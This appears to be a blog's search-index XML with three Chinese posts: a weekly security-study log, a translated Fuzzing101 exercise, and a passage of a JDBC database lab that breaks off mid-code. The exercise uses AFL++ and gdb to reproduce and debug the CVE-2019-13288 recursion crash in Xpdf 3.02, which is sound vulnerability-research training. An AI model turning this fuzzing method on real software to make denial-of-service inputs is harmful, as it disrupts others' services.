<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>个人学习周记（2022年11月起）</title>
    <link href="/2022/11/11/Weekly/"/>
    <url>/2022/11/11/Weekly/</url>
    
    <content type="html"><![CDATA[<h1 id="Weekly"><a href="#Weekly" class="headerlink" title="Weekly"></a>Weekly</h1><p>过去三年：</p><ul><li>高情商：打基础</li><li>低情商：混</li></ul><p>保研后又差不多摸了一个月的鱼。</p><p>是时候跟风写一下周报，作为个人踏上信息安全之路的记录。</p><h2 id="Week-1-2022-10-31-——-11-6"><a href="#Week-1-2022-10-31-——-11-6" class="headerlink" title="Week 1: 2022.10.31 —— 11.6"></a>Week 1: 2022.10.31 —— 11.6</h2><ul><li>完成<code>Fuzzing101 Exercise1</code>，通过这个关于AFL的练习再次入门Fuzzing</li><li>周末参加了两场CTF比赛，分别为<code>N1CTF2022</code>和<code>HECTF2022</code>：<ul><li>前者太难，我没什么参与感</li><li><code>HECTF2022</code>算是我第一次比较有投入感参与的CTF，完成了<code>几道基础CTF题</code>（REVERSE×4, Crypto×3，MISC×3，PWN×1）</li></ul></li></ul><h2 id="Week-2-2022-11-7-——-11-13"><a href="#Week-2-2022-11-7-——-11-13" class="headerlink" title="Week 2: 2022.11.7 —— 11.13"></a>Week 2: 2022.11.7 —— 11.13</h2>]]></content>
    
    
    <categories>
      
      <category>个人经历</category>
      
    </categories>
    
    
    <tags>
      
      <tag>个人经历</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101：Exercise 1 - Xpdf 翻译+解题</title>
    <link href="/2022/11/04/Exercise%201%20-%20Xpdf/"/>
    <url>/2022/11/04/Exercise%201%20-%20Xpdf/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing101：Exercise-1-Xpdf-翻译-解题"><a href="#Fuzzing101：Exercise-1-Xpdf-翻译-解题" class="headerlink" title="Fuzzing101：Exercise 1 - Xpdf 翻译+解题"></a>Fuzzing101：Exercise 1 - Xpdf 翻译+解题</h1><h1 id="题目部分翻译"><a href="#题目部分翻译" class="headerlink" title="题目部分翻译"></a>题目部分翻译</h1><p>题目原文：<a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201</a></p><p>对于这个练习，我们将模糊测试 Xpdf PDF 查看器。目标是在 XPDF 3.02中找到CVE-2019-13288的crash/PoC。</p><blockquote><p>有关 CVE-2019-13288漏洞的更多信息:</p><p>CVE-2019-13288是一个漏洞，可能通过一个精心制作的文件导致无限递归。</p><p>由于程序中每个被调用的函数都在堆栈上分配一个堆栈帧，如果一个函数被递归调用太多次，就会导致堆栈内存耗尽和程序崩溃。</p><p>因此，远程攻击者可以利用这一点进行 DoS 攻击。</p><p>你可在以下链接找到更多有关「不受控制递归」漏洞的资料: <a href="https://cwe.mitre.org/data/definitions/674.html">https://cwe.mitre.org/data/definitions/674.html</a></p></blockquote><h2 id="你会学到什么"><a href="#你会学到什么" class="headerlink" title="你会学到什么"></a>你会学到什么</h2><p>在完成这个练习之后，你将知道使用 AFL 进行fuzzing的基础，例如:</p><ul><li><p>使用插桩编译目标应用程序</p></li><li><p>运行模糊控制器(afl-fuzz)</p></li><li><p>使用调试器(GDB)处理崩溃</p></li></ul><h2 id="开始前阅读"><a href="#开始前阅读" class="headerlink" title="开始前阅读"></a>开始前阅读</h2><ul><li><p>我建议你试着自己解决这个问题，不要检查答案。尽可能地努力尝试，只有在遇到困难的时候，才可以查看下面的示例解决方案。</p></li><li><p>AFL 使用一种非确定性测试算法，因此两个模糊会话永远不会相同。这就是为什么我强烈建议设置一个固定的种子(- s 123)。这样，你的模糊结果将类似于这里显示的，这将使你更容易按照练习。</p></li><li><p>如果发现新的漏洞，请向项目提交安全报告。如果您需要帮助或对流程有任何疑问，GitHub 安全实验室可以帮助您:)</p></li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>所有的练习都在 Ubuntu 20.04.2 LTS 上进行了测试。我强烈建议您使用相同的操作系统版本，以避免不同的模糊结果，</p><h2 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h2><p>让我们首先得到我们的 fuzzing 目标。为你想要 fuzzing 的项目创建一个新的目录:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd $HOME<br>mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/<br></code></pre></div></td></tr></table></figure><p>要使您的环境完全准备就绪，您可能需要安装一些其他工具(即 make 和 gcc)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt install build-essential<br></code></pre></div></td></tr></table></figure><p>下载 Xpdf 3.02:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz<br>tar -xvzf xpdf-3.02.tar.gz<br></code></pre></div></td></tr></table></figure><p>Build Xpdf:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd xpdf-3.02<br>sudo apt update &amp;&amp; sudo apt install -y build-essential gcc<br>./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>测试build的时间到了。首先，你需要下载一些 PDF 示例:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd $HOME/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf<br>wget http://www.africau.edu/images/default/sample.pdf<br>wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf<br></code></pre></div></td></tr></table></figure><p>现在，我们可以用以下方法测试 pdfinfo 二进制文件:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br></code></pre></div></td></tr></table></figure><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221101095110780.png" alt="image-20221101095110780"></p><h2 id="安装AFL"><a href="#安装AFL" class="headerlink" title="安装AFL++"></a>安装AFL++</h2><p>在本课程中，我们将使用 AFL + + fuzzer 的最新版本。</p><p>本地安装(推荐选项)：</p><p>安装依赖项</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools<br>sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev<br></code></pre></div></td></tr></table></figure><p>检验和构建AFL++</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd $HOME<br>git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus<br>export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>make distrib<br>sudo make install<br></code></pre></div></td></tr></table></figure><p>现在，如果一切顺利，你应该能够运行 afl-fuzz。只要输入<code>afl-fuzz</code></p><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221101195726276.png" alt="image-20221101195726276"></p><h2 id="Meet-AFL"><a href="#Meet-AFL" class="headerlink" title="Meet AFL++"></a>Meet AFL++</h2><p>AFL 是一个覆盖引导的fuzzer，这意味着它为每个变异的输入收集覆盖信息，以便发现新的执行路径和潜在的错误。当源代码可用时，AFL 可以使用检测，在每个基本块（函数、循环等）的开头插入函数调用。</p><p>要为我们的目标应用程序启用插桩，我们需要使用 AFL 的编译器编译代码。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r $HOME/fuzzing_xpdf/install<br>cd $HOME/fuzzing_xpdf/xpdf-3.02/<br>make clean<br></code></pre></div></td></tr></table></figure><p>现在我们将使用 <strong>afl-clang-fast</strong> 编译器构建 xpdf:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>现在，您可以使用以下命令运行 Fuzzer:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output<br></code></pre></div></td></tr></table></figure><p>每个选项的简要说明:</p><ul><li><p>-i 表示我们必须放置输入用例的目录(a.k.a 文件示例)</p></li><li><p>-o 表示 AFL + + 将存储变异文件的目录</p></li><li><p>-s 表示要使用的静态随机种子</p></li></ul><p>@@是占位符目标的命令行，AFL 将用每个输入文件名替换它</p><p>所以,基本上fuzzer为每个不同的输入文件将运行该命令<code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code></p><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221101204023640.png" alt="image-20221101204023640"></p><blockquote><p>附：界面信息介绍</p><p><strong>process timing</strong>：执行时间信息</p><ul><li>run time：运行总时间</li><li>last new find：距离最近一次发现新路径的时间</li><li>last saved crash：距离最近一次保存程序崩溃的时间</li><li>last saved hang：距离最近一次保存挂起的时间</li></ul><p><strong>overall results：</strong></p><ul><li>cycles done：运行的总周期数</li><li>corpus count：语料库计数</li><li>saved crashes：保存的程序崩溃个数</li><li>saved hang：保存的挂起个数</li></ul><p><strong>cycle progress</strong>：</p><ul><li>now processing：当前的测试用例ID（所在输入队列的位置）</li><li>runs timed out：超时数量</li></ul><p><strong>map coverage：</strong>覆盖率</p><ul><li>map density：目前已经命中多少分支元组，与位图可以容纳多少的比例</li><li>count coverage：位图中每个被命中的字节平均改变的位数</li></ul><p><strong>stage progress：</strong></p><ul><li>now trying: 指明当前所用的变异输入的方法</li><li>stage execs: 当前阶段的进度指示</li><li>total execs: 全局的进度指示</li><li>exec speed: 执行速度</li></ul><p><strong>findings in depth：</strong>种子变异产生的信息 </p><ul><li>favored items: 基于最小化算法产生新的更好的路径</li><li>new edges on: 基于更好路径产生的新边</li><li>total crashes: 基于更好路径产生的崩溃</li><li>total tmouts: 基于更好路径产生的超时 包括所有超时的超时</li></ul><p><strong>fuzzing strategy yields：</strong> 进一步展示了AFL所做的工作，在更有效路径上得到的结果比例，对应上面的now trying</p><ul><li><p>bit flips: 比特位翻转，例如：</p><ul><li>bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</li><li>bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</li><li>…..</li></ul></li><li><p>byte flips: 字节翻转</p></li><li><p>arithmetics: 算术运算，例如：</p><ul><li>arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</li></ul></li><li><p>know ints: 用于替换的基本都是可能会造成溢出的数，例：</p><ul><li>interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</li></ul></li><li><p>dictionary: 有以下子阶段：</p><ul><li><p>user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</p></li><li><p>user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</p></li><li><p>auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</p><p>其中，用户提供的tokens，是在词典文件中设置并通过-x选项指定的，如果没有则跳过相应的子阶段。</p></li></ul></li><li><p>havoc：顾名思义，是充满了各种随机生成的变异，是对原文件的“大破坏”。具体来说，havoc包含了对原文件的多轮变异，每一轮都是将多种方式组合（stacked）而成</p><p>splice：在任意选择的中点将队列中的两个随机输入拼接在一起.</p></li><li><p>py/custom/req：</p></li><li><p>trim：修建测试用例使其更短，但保证裁剪后仍能达到相同的执行路径</p></li><li><p>eff</p></li></ul><p><strong>item geometry：</strong></p><ul><li>levels: 表示测试等级</li><li>pending: 表示还没有经过fuzzing的输入数量</li><li>pend fav: 表明fuzzer感兴趣的输入数量</li><li>own finds: 表示在fuzzing过程中新找到的，或者是并行测试从另一个实例导入的数量</li><li>imported: n/a表明不可用，即没有导入</li><li>stability: 表明相同输入是否产生了相同的行为，一般结果都是100%</li></ul></blockquote><p>你可以看到 <code>saved crashes</code> 值为红色，表示发现的crash的数量。您可以在<code>$HOME/fuzzing _ xpdf/out/</code>目录中找到这些崩溃文件。一旦找到第一个crash，你就可以关掉警报器了，这就是我们要解决的。在出现crash之前，根据机器性能的不同，可能需要一到两个小时。</p><p>在这个阶段，你已经学到了:</p><ul><li><p>如何使用使用检测的 afl 编译器编译目标</p></li><li><p>如何启动 afl + +</p></li><li><p>如何检测您的目标的独特崩溃</p></li></ul><p>接下来呢？我们没有关于这个 bug 的任何信息，只是程序崩溃了… 现在是进行调试和分类的时候了！</p><h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这项练习，你需要:</p><ul><li><p>使用指定的文件重现崩溃</p></li><li><p>调试崩溃以发现问题</p></li><li><p>解决问题</p></li></ul><h1 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h1><h2 id="1-Reproduce-the-crash-with-the-indicated-file"><a href="#1-Reproduce-the-crash-with-the-indicated-file" class="headerlink" title="1. Reproduce the crash with the indicated file"></a>1. Reproduce the crash with the indicated file</h2><p>在<code>~/fuzzing_xpdf/out/default/crashes</code>中找到第一个使程序崩溃对应的文件</p><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221104163040035.png" alt="image-20221104163040035"></p><p>将这个文件作为<code>pdftotext</code>的输入</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd ~/fuzzing_xpdf/out/default/crashes<br><span class="hljs-meta prompt_">$</span><span class="language-bash">HOME/fuzzing_xpdf/install/bin/pdftotext <span class="hljs-string">&#x27;id:000000,sig:11,src:000000+000810,time:128482,execs:43565,op:splice,rep:16&#x27;</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/output</span><br></code></pre></div></td></tr></table></figure><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221103222314645.png" alt="image-20221103222314645"></p><p>它会导致段错误（segmentation fault）使程序崩溃。</p><h2 id="2-Debug-the-crash-to-find-the-problem"><a href="#2-Debug-the-crash-to-find-the-problem" class="headerlink" title="2 Debug the crash to find the problem"></a>2 Debug the crash to find the problem</h2><p>在使用gdb调试前，使用<code>-g -O0</code>选项重建<code>Xpdf</code></p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">rm -r $HOME/fuzzing_xpdf/install<br>cd $HOME/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>开始使用gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000000+000810,time:128482,execs:43565,op:splice,rep:16 $HOME/fuzzing_xpdf/output<br></code></pre></div></td></tr></table></figure><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221104165132974.png" alt="image-20221104165132974"></p><p><code>bt</code>查看函数调用栈</p><p><img src="/2022/11/04/Exercise%201%20-%20Xpdf/image-20221104165419301.png" alt="image-20221104165419301"></p><p>可以观察到多次在最后调用了<code>Parser::getObj</code>，似乎进入了一个无限递归。</p><p>对应CVE：<a href="https://www.cvedetails.com/cve/cve-2019-13288/">https://www.cvedetails.com/cve/cve-2019-13288/</a></p><blockquote><p>In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite recursion via a crafted file. A remote attacker can leverage this for a DoS attack. This is similar to CVE-2018-16646.</p></blockquote><h2 id="3-Fix-the-issue"><a href="#3-Fix-the-issue" class="headerlink" title="3 Fix the issue"></a>3 Fix the issue</h2><p>下载修复了该CVE的<code>xpdf 4.02</code>进行对比，</p><p>修复方式：多了一个变量记录循环次数，超过一定次数就结束进程。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/sizaif/article/details/124090993">AFL(american fuzzy lop)学习一</a></p><p><a href="https://blog.csdn.net/qq_32464719/article/details/80592902">AFL技术实现分析</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统软件安全</tag>
      
      <tag>Fuzzing</tag>
      
      <tag>Fuzzing101</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统》课程之实验七 通过ODBC/JDBC转移异构数据库中数据</title>
    <link href="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/"/>
    <url>/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="《数据库系统》课程之实验七-通过ODBC-JDBC转移异构数据库中数据"><a href="#《数据库系统》课程之实验七-通过ODBC-JDBC转移异构数据库中数据" class="headerlink" title="《数据库系统》课程之实验七 通过ODBC/JDBC转移异构数据库中数据"></a>《数据库系统》课程之实验七 通过ODBC/JDBC转移异构数据库中数据</h1><hr><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1 实验目的"></a>1 实验目的</h2><p>​    学会配置ODBC/JDBC数据源，熟悉使用ODBC/JDBC来进行数据库应用程序的设计，熟悉通过ODBC/JDBC接口访问异构数据库并对异构数据库进行操作。</p><h2 id="2-实验平台和实验工具"><a href="#2-实验平台和实验工具" class="headerlink" title="2 实验平台和实验工具"></a>2 实验平台和实验工具</h2><p>实验平台：2个异构数据库（如MySQL数据库、SQL Sever数据库等ODBC/JDBC常支持的数据库）。</p><p>通过JAVA语言等编写访问数据库的应用程序。编程工具自选。</p><h2 id="3-实验内容和要求"><a href="#3-实验内容和要求" class="headerlink" title="3 实验内容和要求"></a>3 实验内容和要求</h2><p>配置两个不同的数据源，使用ODBC/JDBC编写程序连接两个不同关系数据库管理系统的数据源，对异构数据库中的数据进行互相转移。如，将MySQL数据库的某个表中的数据转移到SQL Server数据库的表，将SQL Server中的数据转移至MySQL数据库。</p><p>认真填写实验报告，并且提交源程序，保证可正确编译和运行。</p><h4 id="3-1-知识预备"><a href="#3-1-知识预备" class="headerlink" title="3.1 知识预备"></a>3.1 知识预备</h4><p>​    提前自行了解ODBC/JDBC的概念和使用流程。</p><h4 id="3-2-实验要求"><a href="#3-2-实验要求" class="headerlink" title="3.2 实验要求"></a>3.2 实验要求</h4><p>​    给出配置两个不同的数据源的过程。提交应用程序源代码，并标识必要的注释，尽可能清楚明白地说明程序的功能，实现的方法，关键数据结构、变量、函数的定义。</p><h2 id="4-实验过程"><a href="#4-实验过程" class="headerlink" title="4 实验过程"></a>4 实验过程</h2><h3 id="配置数据源"><a href="#配置数据源" class="headerlink" title="配置数据源"></a>配置数据源</h3><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>​    在<strong>实验一</strong>中已经对MySQL进行了配置</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><ul><li><p>下载镜像<code>sql_server_2019_standard_x64_dvd_2bfe815a.iso</code>，并解压打开，直接双击<code>setup</code>运行</p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513104907484.png" alt="image-20220513104907484"></p></li><li><p>完成左侧的安装步骤</p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513110329985.png" alt="image-20220513110329985"></p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513112757582.png" alt="image-20220513112757582"></p></li><li><p>安装并打开数据库管理工具，成功连接SQL Server2019服务器</p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513212044408.png" alt="image-20220513212044408"></p><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513212029841.png" alt="image-20220513212029841"></p></li></ul><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220513212128315.png" alt="image-20220513212128315"></p><ul><li>后改用SQL Server身份认证，使用登录名和密码连接。</li></ul><p><img src="/2022/05/15/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%83%20%E9%80%9A%E8%BF%87ODBCJDBC%E8%BD%AC%E7%A7%BB%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E6%95%B0%E6%8D%AE/image-20220518095853266.png" alt="image-20220518095853266"></p><h3 id="关键代码及注释"><a href="#关键代码及注释" class="headerlink" title="关键代码及注释"></a>关键代码及注释</h3><blockquote><p>展示编写的类</p></blockquote><h4 id="连接MySQL数据库"><a href="#连接MySQL数据库" class="headerlink" title="连接MySQL数据库"></a>连接MySQL数据库</h4><p>基于jdbc驱动进行连接</p><p><strong>类</strong>：<code>MysqlConnection</code></p><ul><li><code>static初始化</code>时从properties文件中获取属性，包括<code>驱动名</code>、<code>URL</code>、<code>用户名</code>、<code>密码</code>，然后通过<code>Class.forName</code>加载驱动。</li><li>public void <code>connect()</code>调用<code>DriverManager.getConnection</code>连接数据库。</li><li>public Connection <code>getConnection()</code>返回当前连接。</li><li>public void <code>close()</code>关闭数据库连接。</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MysqlConnection</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String driverName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String url;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String password;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span 